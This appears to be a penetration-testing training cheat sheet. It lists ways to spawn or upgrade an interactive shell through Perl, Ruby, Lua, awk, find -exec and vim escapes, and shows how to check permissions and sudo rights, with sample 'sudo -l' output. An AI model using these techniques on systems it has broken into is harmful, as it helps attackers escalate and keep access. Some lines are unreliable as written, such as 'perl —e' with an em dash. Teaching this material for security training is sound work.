## /bin/sh -i

This command will execute the shell interpreter specified in the path in interactive mode (`-i`).
##### Interactive

```bash
/bin/sh -i
sh: no job control in this shell
sh-4.2$
```

---
## Perl

If the `programming language` Perl is present on the system, these commands will execute the shell interpreter specified.
##### Perl To Shell

```bash
perl —e 'exec "/bin/sh";'
```

```bash
perl: exec "/bin/sh";
```

---
## Ruby

```bash
ruby: exec "/bin/sh"
```

---

## Lua

If the `programming language` Lua is present on the system, we can use the `os.execute` method to execute the shell interpreter specified using the full command below:
##### Lua To Shell

```bash
lua: os.execute('/bin/sh')
```

---

## AWK

`AWK` is a compact, C-like pattern-scanning and processing language found on most UNIX/Linux systems and commonly used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell — the short `AWK` one-liner below demonstrates this.

##### AWK To  Shell

```bash
awk 'BEGIN {system("/bin/sh")}'
```

---

## Find

`Find` is a command present on most `Unix/Linux` systems, widely used to search for and navigate through files and directories using various criteria. It can also be leveraged to execute applications or invoke a `shell interpreter` — a technique often utilized in `post-exploitation` to gain or upgrade access.
##### Using Find For A Shell

```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

This `find` usage searches for files matching the `-name` pattern, then runs `/bin/awk` to execute the same `awk` one-liner discussed earlier to spawn a `shell interpreter`.

---
## Using Exec To Launch A Shell

```bash
find . -exec /bin/sh \; -quit
```

 This `find` command leverages the execute option (`-exec`) to invoke the `shell interpreter` directly. If `find` fails to locate the specified file, no `shell` will be obtained.
 
---
## VIM

##### Vim To Shell

```bash
vim -c ':!/bin/sh'
```

##### Vim Escape

```bash
vim
:set shell=/bin/sh
:shell
```

---

## Execution Permissions Considerations

Besides knowing these options, always check the `permissions` your `shell session` account holds. Use this command to view file properties and your access rights for any file or binary:
##### Permissions

```bash
ls -la <path/to/fileorbinary>
```

We can also attempt to run this command to check what `sudo` permissions the account we landed on has:

##### Sudo -l

```bash
sudo -l
Matching Defaults entries for apache on ILF-WebSrv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```


